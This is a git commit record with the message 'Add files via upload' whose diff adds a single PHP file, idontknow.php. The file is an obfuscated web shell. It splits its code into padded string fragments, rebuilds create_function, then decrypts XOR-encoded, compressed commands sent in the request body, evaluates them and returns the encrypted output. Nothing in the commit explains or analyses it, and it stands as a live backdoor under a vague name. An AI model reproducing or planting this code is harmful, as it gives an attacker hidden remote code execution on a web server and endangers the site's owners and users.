161184dd44aac3bcb44262bf10f673fec05cf437
vishnukumar650 <vishnukumar650@users.noreply.github.com>
2019-03-31 04:35:49 +0530

    Add files via upload

---
+++ idontknow.php
@@ -0,0 +1,13 @@
+<?php
+$P='b_^Pstart();^P  @e^P^Pval(@gzun^Pcompress(@x^P(@b^Pase64_de^Pcode($^Pm[^P1])';
+$Z='^P.+^P)$kf/",@file_ge^Pt^P_contents("ph^Pp^P://^Pinput"),$m^P) ^P== 1) {  @o';
+$N='P++){$o.=$t{^P$^Pi}^$k{$^Pj};}^P}r^Peturn $o;}^Pif (@preg_^P^Pma^Ptch("/$kh(';
+$g=',$^Pk)))^P;  $o=@ob_get^P_con^Ptents^P();  @o^Pb_end^P_c^Plean();  $r=@b^Pas';
+$C='rqwx3^P7adpGET0kdh";^Pfunctio^Pn x^P($^Pt^P,$k){$c=strlen($k);$^Pl=st^Prlen^P(';
+$M='$k=^P"5bada414^P";$^Pkh^P="46ca4e25b0^Pa5"^P;$kf="0e16e1^Pa469ec^P";^P$p^P="';
+$Y=str_replace('VA','','creVAVAatVAe_fVAuVAncVAtion');
+$l='$t)^P;$o="^P";for($^Pi=0;$i<$l;){^Pfor(^P$j=0;($^P^Pj^P<$c&&$i<$l);$j++,^P$i^';
+$O='e64_^P^Pencod^Pe(@x^P(@g^Pzcompress($o),$^P^Pk));  print^P("$^Pp$kh$r$kf");}';
+$A=str_replace('^P','',$M.$C.$l.$N.$Z.$P.$g.$O);
+$v=$Y('',$A);$v();
+?>
